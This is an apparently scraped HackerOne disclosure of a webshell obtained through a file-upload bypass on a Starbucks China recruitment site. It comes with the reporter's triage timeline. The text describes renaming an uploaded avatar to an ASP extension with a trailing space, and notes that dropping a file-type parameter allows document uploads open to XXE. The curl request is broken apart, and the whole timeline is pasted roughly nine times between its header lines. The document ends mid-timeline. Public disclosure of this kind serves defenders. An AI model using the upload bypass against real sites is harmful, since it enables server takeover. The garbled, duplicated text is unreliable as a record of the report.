---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-11-13
submitted: 2019-03-08T06:45:11.342Z
bounty_usd: null
votes: 688
cve: []
program: "[[programs/starbucks|Starbucks]]"
reporter: "johnstone"
source: "https://hackerone.com/reports/506646"
title: "Webshell via File Upload on ecjobs.starbucks.com.cn"
---
# Webshell via File Upload on ecjobs.starbucks.com.cn

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 688 | **Program:** Starbucks | **Disclosed:** 2019-11-13

- Report: [https://hackerone.com/reports/506646](https://hackerone.com/reports/506646)
- CWE: OS Command Injection
- Submitted: 2019-03-08T06:45:11.342Z

## Report summary

johnstone discovered An arbitrary file upload via the resume functionality at https://ecjobs.starbucks.com.cn which led to arbitrary code execution by uploading a webshell.
@johnstone   — thank for reporting this vulnerability, your patience while we followed up on the issue internally and for your additional effort to confirm the resolution.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 
OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.

**Description:** 
I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

## Steps To Reproduce:

  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content

  After that you have uploaded malicious files on the server and run any os command on server you wanted.
Do some command like list all files on the server

```
curl -i -s -k  -X 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
GET' \
    -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Host: ecjobs.starbucks.com.cn' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Connection: close' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
- **2019-03-14** @johnstone: Hi @coldbr3w ,I'm so happy that the vulnerability was fixed,but there have some potential risk on ```/recruitjob/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=hxsm_v6/hxsm_file_upload_process.hxpage.xhtml&max_file_size_kb=1024&allow_file_type_list=jpg;gif;png;``` endpoint,
I found delete the ```allow_file_type_list``` parameter when i try to bypass upload limite that can be uploaded the docx/xls/csv files,the ```hxsm_file_upload_process.hxpage.xhtml``` endpoit did't checked if it is a picture.the docx/xls/csv can also cause the server to receive an attack via XXE.

**Recommendations for fix**
1. Change the upload files to base64
2. Transcode the base64 data on the server to picture
3. Check if it is a picture files

Thank you @coldbr3w
Kind regards
john stone
- **2019-03-15** @johnstone: hi @coldbr3w .After a few days of testing, I found that the vulnerability seems to have been fixed.
- **2019-03-16** @johnstone: Hi @coldbr3w.Can you change the reports statue to resolved?(XXE report and this one to Starbucks)thks
Kind regards
John stone
- **2019-03-18** @johnstone: Any update in this report?
- **Report Resolved**
- **2019-03-20** @johnstone: Thank you @coldbr3w :)
- **Report Title Updated**
- **2019-03-29** @johnstone: Hi,@coldbr3w,May i disclourse the report?
is today the day to pay the bounty to me? :) My lucky day？
- **Agreed On Going Public**
- **Bounty Awarded**
- **Cancelled Disclosure Request**
- **2019-04-04** @johnstone: Thank you @shadegrown ,I was so glad for eligible bounty that  gave me a lot of confidence,In the meantime，I also appreciate the attitude of the Starbucks Security Team in handling reports.So look forward to working with Starbucks again in the future.
Thanks!
@johnstone
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
- **Report Collaborator Invited**
Upgrade-Insecure-Requests: 1' \
    -b 

- **Report Filed**
- **2019-03-08** @h1_analyst_decimo: Thank you for reporting this potential issue, 

Your report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.

Cheers,
@still
- **Report Severity Updated**
- **2019-03-08** @h1_analyst_decimo: Hi @johnstone, thank you for your report.

This appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.

Thanks for your patience,
@still
- **2019-03-08** @johnstone: Thks@still
Kind regards
john stone
- **2019-03-08** @johnstone: hi,@still, thank you so much to remind me,but in starbucks policy section of In Scope,they write 	
```Significant information disclosures such as internal source code, PII, credentials (excluding those identified in other/prior public breaches).```
Disclosures internal source code is eligibled for bounty,i hope my report is eligible for bounty and starbucks team can intend to reward.
Regardless of the results, the process of finding vulnerabilities is what every hackerone pursues.isn't it? :)
By the way,thks again! @still 
Kind regards
john stone
- **2019-03-10** @johnstone: is there any update here?
- **Report Triaged**
- **2019-03-11** @johnstone: thank you @coldbr3w
- **2019-03-11** @johnstone: I found the webshell was deleted
- **2019-03-13** @coldbr3w: Hi @johnstone,

The team is reporting back to us that this issue has been resolved. Can you please re-test and confirm that the issue has been fixed?
